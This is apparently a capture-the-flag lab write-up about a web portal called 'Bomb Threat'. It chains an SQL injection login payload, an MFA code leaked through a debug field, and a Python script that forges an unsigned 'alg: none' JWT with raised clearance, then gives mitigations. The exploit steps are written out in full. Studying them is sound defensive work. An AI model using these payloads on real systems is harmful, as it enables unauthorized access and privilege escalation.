---
title: "JWT Algorithm Confusion Leads to Privilege Escalation | Bomb Threat"
date: 2026-06-22 15:35:00 +0530
categories: [A07 - Authentication Failures, Authentication Bypass]
tags: [webverse-pro, bomb-threat, jwt, alg-none, authentication-bypass, privilege-escalation, sql-injection, mfa-bypass]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/bomb-threat.webp
  alt: "Bomb Threat JWT Algorithm Confusion lab cover"
---

## Lab Link

[WebVerse Pro - Bomb Threat](https://dashboard.webverselabs-pro.com/labs/bombthreat)

---

## Overview

Bomb Threat was a WebVerse Pro medium-difficulty lab centered around a critical NEXUS Control portal. The application exposed a login flow, email-based MFA, a device dashboard, and a deactivation endpoint protected by clearance level checks.

The objective was to authenticate as a low-clearance operator, bypass the application’s access-control boundary, and deactivate the armed device.

The final exploit chain combined:

- SQL Injection authentication bypass
- MFA debug information disclosure
- JWT `alg: none` acceptance
- Token claim tampering from `level1` to `level5`

## Objective

The goal was to access the NEXUS Control dashboard and call the device deactivation endpoint with **LEVEL 5 clearance**.

The dashboard itself revealed the important clue:

```text
Token encodes level1. Deactivation requires level5. Token is sent with each request.
```

This confirmed that authorization was being enforced using a token claim rather than a server-side role lookup.

## Vulnerability Identification

The login endpoint accepted JSON input:

```http
POST /api/auth/login HTTP/1.1
Host: bombthreat.local
Content-Type: application/json

{
  "username": "' or 1=1-- -",
  "password": "a"
}
```

The SQL Injection payload successfully bypassed authentication and returned a valid login response:

```json
{
  "success": true,
  "message": "Credentials accepted. MFA required.",
  "user": {
    "id": "usr_bg_0042",
    "email": "b.***goldstein@nexus-ctrl.io",
    "last_login": "2024-01-14T09:23:11Z",
    "clearance": "LEVEL 1"
  },
  "mfa": {
    "method": "EMAIL_OTP",
    "destination": "b.***goldstein@nexus-ctrl.io",
    "expires_in": 300,
    "_debug": {
      "note": "TODO: remove before production",
      "otp_value": "REDACTED"
    }
  }
}
```

The `_debug.otp_value` field leaked the one-time MFA code directly in the response.

## Recon and Approach

The frontend JavaScript revealed the core API routes:

```text
POST /api/auth/login
POST /api/auth/verify-mfa
GET  /api/device
POST /api/bomb/deactivate
```

After the login bypass, the leaked OTP was submitted to the MFA endpoint:

```http
POST /api/auth/verify-mfa HTTP/1.1
Host: bombthreat.local
Content-Type: application/json
Cookie: connect.sid=<redacted>

{
  "code": "<leaked_otp>"
}
```

The response returned a JWT access token:

```json
{
  "success": true,
  "message": "Authentication successful.",
  "access_token": "<jwt_token>"
}
```

Decoding the JWT showed the operator had only low-level clearance:

```json
{
  "sub": "bgoldstein",
  "clearance": "level1",
  "iat": 1781963443
}
```

## Exploitation

The deactivation endpoint rejected the legitimate token:

```http
POST /api/bomb/deactivate HTTP/1.1
Host: bombthreat.local
Authorization: Bearer <level1_jwt>
Content-Type: application/json
Cookie: connect.sid=<redacted>
```

The response confirmed the authorization condition:

```json
{
  "success": false,
  "error": "INSUFFICIENT_CLEARANCE",
  "message": "Deactivation requires LEVEL 5 clearance. You only have: level1 clearance."
}
```

Since the token carried the clearance claim, the next step was to test whether the server properly enforced the JWT signing algorithm.

The original token used `HS256`:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

A forged unsigned JWT was created with `alg` set to `none` and the clearance claim changed from `level1` to `level5`.

```python
import base64
import json

def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "sub": "bgoldstein",
    "clearance": "level5",
    "iat": 1781963443
}

token = b64url(header) + "." + b64url(payload) + "."
print(token)
```

The forged token was then submitted to the deactivation endpoint:

```http
POST /api/bomb/deactivate HTTP/1.1
Host: bombthreat.local
Authorization: Bearer <forged_alg_none_jwt>
Content-Type: application/json
Cookie: connect.sid=<redacted>

{}
```

## Proof / Flag

The server accepted the forged LEVEL 5 token:

```json
{
  "success": true,
  "message": "LEVEL 5 clearance accepted. Device deactivated.",
  "flag": "WEBVERSE{...}"
}
```

The flag is intentionally redacted for the public writeup.

## Root Cause

The primary root cause was insecure JWT verification.

The backend accepted a token with:

```json
{
  "alg": "none"
}
```

This allowed the attacker to remove the signature entirely and modify trusted authorization claims inside the JWT payload.

The application also trusted the `clearance` claim directly from the token:

```json
{
  "clearance": "level5"
}
```

Instead of validating the operator’s clearance server-side, the deactivation endpoint relied on attacker-controllable token content.

Additional root causes in the exploit chain included:

- SQL Injection in the login query
- Debug MFA data exposed in a production response
- No strict JWT algorithm allowlist
- Authorization based on client-side token claims without strong verification

## Impact

The vulnerability chain allowed a low-clearance operator account to escalate from `level1` to `level5`.

In a real system, this would allow an attacker to:

- Bypass login controls
- Bypass MFA
- Forge privileged access tokens
- Execute restricted device-control actions
- Trigger or disable critical operational workflows
- Completely break role-based access control

In this lab, the impact was full deactivation of the NEXUS device and retrieval of the flag.

## OWASP Top 10 2025 

This issue maps primarily to:

```text
A07: Authentication Failures
```

The main authentication failure was accepting an unsigned JWT and trusting modified authorization claims.

It also relates to:

```text
A05: Injection
```

because the initial foothold came from SQL Injection in the login endpoint.

And:

```text
A02: Security Misconfiguration
```

because production responses exposed MFA debug values.

## Mitigation

To prevent this class of vulnerability:

1. Reject `alg: none` tokens completely.
2. Enforce a strict JWT algorithm allowlist, such as only `HS256` or only `RS256`.
3. Never select JWT verification behavior directly from untrusted token headers.
4. Validate JWT signatures on every protected request.
5. Store sensitive authorization state server-side where possible.
6. Re-check user role and clearance from a trusted backend data source before critical actions.
7. Remove debug fields from production responses.
8. Use parameterized queries for login logic.
9. Add regression tests for JWT algorithm confusion attacks.
10. Log and alert on malformed or unsigned JWT usage.

## Lessons Learned

This lab showed how multiple smaller weaknesses can combine into a full compromise.

The SQL Injection bypass opened the login flow, the MFA debug leak gave access to the authenticated session, and the JWT misconfiguration allowed privilege escalation. The final deactivation was only possible because the server trusted a tampered `clearance` claim.

The most important lesson is that JWTs must be treated as untrusted input until their signature and algorithm are strictly verified. Authorization decisions should never rely on unsigned or weakly verified client-controlled claims.
